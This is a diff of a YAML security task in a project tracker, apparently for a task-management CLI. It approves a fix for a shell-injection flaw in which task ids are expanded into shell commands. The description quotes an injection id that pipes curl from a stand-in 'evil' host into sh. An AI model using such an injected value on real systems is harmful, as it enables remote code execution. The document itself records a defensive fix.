@@ -1,13 +1,13 @@
 id: c15
 type: chore
 title: 'SECURITY: cross-check task id: field against filename — {{.ID}} shell-injection in gate/post commands'
-status: impl_review
+status: approved
 priority: high
 tags:
     - adapter
     - sec
 created: "2026-07-22T08:39:39Z"
-updated: "2026-07-22T10:45:16Z"
+updated: "2026-07-22T10:47:40Z"
 description: 'Confirmed RCE (arch review 2026-07-22, exploit run): yaml Get/List take the domain id from the file''s id: field (task.go), never cross-checked against the filename stem; NewTaskID (identity.go) accepts any non-empty string; core expands {{.ID}} into sh -c gate/post commands. A poisoned .mtt/tasks/tN.yaml with id: ''t1"; curl evil|sh;"'' runs arbitrary code on the next mtt status/start/approve/deliver. Blast radius = any flow that puts {{.ID}} in a shell command — i.e. the flagship dogfood flow (git commit/push, gh pr create) and THIS repo. Task files are machine-written (reviewers scrutinize config.yaml, not tasks/*.yaml — AGENTS.md SEC2), so a poisoned file rides a PR through the review blind spot. Fix: reject task.ID != filename-stem in Get/List and validate the id charset (prefix+digits) at the DTO boundary (~6 lines); this also catches the duplicate-id-across-files split-brain the product audit found. Add an e2e that a mismatched/hostile id is refused. Gates the pilot (the pilot runs the flagship flow).'
 history:
     - at: "2026-07-22T10:25:43Z"
@@ -38,3 +38,7 @@ history:
       checks:
         - cmd: make check
           exit: 0
+    - at: "2026-07-22T10:47:40Z"
+      by: Grigorii Pashukhin
+      from: impl_review
+      to: approved
